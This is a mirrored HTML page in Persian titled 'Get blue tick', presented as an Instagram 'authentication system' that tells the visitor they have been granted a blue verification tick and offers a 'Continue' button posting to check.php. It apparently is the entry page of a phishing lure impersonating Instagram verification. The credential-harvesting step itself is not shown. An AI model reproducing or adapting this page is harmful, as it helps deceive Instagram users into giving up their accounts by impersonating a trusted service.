
<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from beehives.me/fp/index by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 09 Nov 2020 14:43:13 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="UTF-8">
<meta name="description" content="">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>دریافت تیک آبی</title>
<link href="cdn.rawgit.com/rastikerdar/shabnam-font/v4.0.0/dist/font-face.css" rel="stylesheet" type="text/css" /><link rel="stylesheet" href="assets/css/style.css">
<script async src='../cdn-cgi/bm/cv/2172558837/api.js'></script></head>
<body>
<div class="card">
<div class="field">
<span class="header">سامانه احراز هویت </span><br>
<div id="verfy"><img src="assets/img/verify.png" alt="" width="100" height="100" /></div>
شما با تیک آبی به رسمیت شناخته شده و نباید از این امر سواستفاده کنید
<form action="check.php" method="post">
<button type="submit" value="Submit" class="button"><span>ادامه</span></button>
</div>
</form>
<br><br>
Instagram FA
</div>
</div>
</div>
<script src='../../cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script type="text/javascript">(function(){window['__CF$cv$params']={r:'5ef84de78a26c29f',m:'b1a9c60451e91f8f3367ff21989ee49f394d5c69-1604932988-1800-AXTOO9WC2iKhiyKw8E44lOpvLNcf12RR2A82u2HJdL09Znbs+oj1b61cXWsEbSpQpXpVfqeM+eA1H1uMWAKu8pTSIcVIK3nyrACSVYGwaE16deXCFUNXJiFGSmhZl55GVQ==',s:[0xdfe86672cc,0x0067ecf100],}})();</script></body>

<!-- Mirrored from beehives.me/fp/index by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 09 Nov 2020 14:43:21 GMT -->
</html>
